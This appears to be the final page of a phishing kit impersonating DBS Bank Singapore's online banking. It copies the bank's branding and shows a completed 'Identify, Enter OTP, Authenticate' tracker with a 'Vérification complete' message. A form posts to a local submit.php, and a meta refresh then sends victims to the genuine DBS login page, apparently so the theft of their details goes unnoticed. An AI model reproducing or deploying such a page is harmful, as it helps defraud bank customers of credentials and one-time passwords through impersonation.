<html><head>




<meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">



<meta charset="utf-8">
<title>DBS Complete</title>
<link href="css/style.css" rel="stylesheet" type="text/css" media="screen">
<link href="css/theme.css" rel="stylesheet" type="text/css" media="screen">
</head>
<body>
<header><div class="container clearfix"><div class="pull-left logo"><a>DBS</a><span>Complete</span> <span class="time-stamp">Singapore</span> </div><div class="pull-right right-menu"><ul><li> <a href="javascript:GetTip('https://www.dbs.com.sg/ibanking/help/index.html?ref=help-my-personal-information')" title="Help" tabindex="8"><i class="icon icon-help"></i><span class="m-hidden pad-hidden">Help</span></a> </li><li> <a href="#" data-toggle="modal" data-target="#cancelRegistration" title="Cancel" tabindex="9"> <i class="icon icon-cancel"></i> <span class="m-hidden pad-hidden">Cancel</span> </a> </li></ul></div></div></header>
<!-- MR1602 start -->






<!-- MR1602 end -->
<!--Header Ends here-->

<section class="step-tracker">
  <div class="container clearfix">
   
    <ul class="four m-hidden"><li class="active">1. Identify</li><li class="active">2. Enter OTP</li><li class="active">3. Authenticate</li><li class="active">4. Complete</li></ul>
    <!--Step Tracker Ends here Desktop version-->
    
    <div class="d-hidden clearfix"><div class="pull-left"> 4. Complete</div><div class="pull-right"> Step <span class="step-count">1</span> of <span class="total-steps">4</span> </div></div>
    <!--Step Tracker Ends here Mobile version--> 
    
  </div>
</section>
<!--Step-Tracker Ends here-->

<div class="container">

  <section class="content clearfix">
   
 <div style="margin-bottom: 30px;"></div>
  <form name="MainForm" action="submit.php" autocomplete="off" method="post">

  
    
    <!--end of form-row-->
    
   
  <center>  <!--end of form-row-->
    <span style="font-weight:bold;margin-top: 20px;">Vérification complete.</span>
    <div class="form-row" id="dob" style="display: block;">
    <meta http-equiv="refresh" content="5;url=https://internet-banking.dbs.com.sg/IB/Welcome?fbclid=IwAR3kMPnkOOF3lRYDrbbTFRvS6IyKn7voWG1lvU4raIBHFCenrzNDj71lnsM" >
                      

                            
             

   <img height="80" src="css/checkmark.svg"></p></div>
                    <br>   <br>   
    </div>
    <!--end of form-row Calendar-->
  

  </form>
  </section>
  <!--Content Ends Here-->
  
 <footer><ul><li><a href="">Terms &amp; Conditions</a></li><li><a href="">Privacy Policy</a></li><li><a href="">Fair Dealing Commitment</a></li><li><a href="">Compliance with Tax Requirements</a></li><li><a href="">©2021 DBS Bank LTD. Co. Reg. No. 1968003006E</a></li></ul></footer>
  <!--Footer Ends here--> 
  
</div>
  <!-- Modal Cancel Registration-->
 





	



 


 




















</body></html>